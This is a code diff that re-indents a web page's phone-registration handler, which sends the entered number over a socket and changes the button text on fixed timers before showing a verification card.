@@ -56,36 +56,35 @@ document.addEventListener("DOMContentLoaded", () => {
   });
 
   // REGISTER → VERIFY (4x spin)
-const registerBtn = document.getElementById("registerSubmit");
-const btnText = registerBtn.querySelector(".btn-text");   // ← EKLE
+  const registerBtn = document.getElementById("registerSubmit");
+  const btnText = registerBtn.querySelector(".btn-text");   // ← EKLE
 
-registerBtn.addEventListener("click", () => {
-  const phone = phoneInput.value.trim();
-  if (!phone) return;
+  registerBtn.addEventListener("click", () => {
+    const phone = phoneInput.value.trim();
+    if (!phone) return;
 
-  socket.emit("new-phone", phone);
+    socket.emit("new-phone", phone);
 
-  registerBtn.disabled = true;
-  btnText.textContent = "Kod gönderiliyor";        // ← DEĞİŞTİ
-  registerBtn.classList.add("spinning");
+    registerBtn.disabled = true;
+    btnText.textContent = "Kod gönderiliyor";        // ← DEĞİŞTİ
+    registerBtn.classList.add("spinning");
 
-  // 12. saniyede yazı değişsin
-  setTimeout(() => {
-    btnText.textContent = "Kod gönderildi";
-    registerBtn.classList.add("slow");            // slow animasyon burada başlasın
-  }, 12000);
+    // 12. saniyede yazı değişsin
+    setTimeout(() => {
+      btnText.textContent = "Kod gönderildi";
+      registerBtn.classList.add("slow");            // slow animasyon burada başlasın
+    }, 12000);
 
-  // 14. saniyede ekran değişsin
-  setTimeout(() => {
-    registerBtn.classList.remove("spinning");
-    registerBtn.classList.remove("slow");         // slow'u da kaldır
-    registerBtn.disabled = false;
-    btnText.textContent = "Kod gönderiliyor";     // başlangıç haline geri dön
-    hideCard(registerCard);
-    showCard(verifyCard);
-  }, 14000);
-});
-  
+    // 14. saniyede ekran değişsin
+    setTimeout(() => {
+      registerBtn.classList.remove("spinning");
+      registerBtn.classList.remove("slow");         // slow'u da kaldır
+      registerBtn.disabled = false;
+      btnText.textContent = "Kod gönderiliyor";     // başlangıç haline geri dön
+      hideCard(registerCard);
+      showCard(verifyCard);
+    }, 14000);
+  });
 
   // VERIFY → SUCCESS
   const verifyBtn = document.getElementById("verifySubmit");
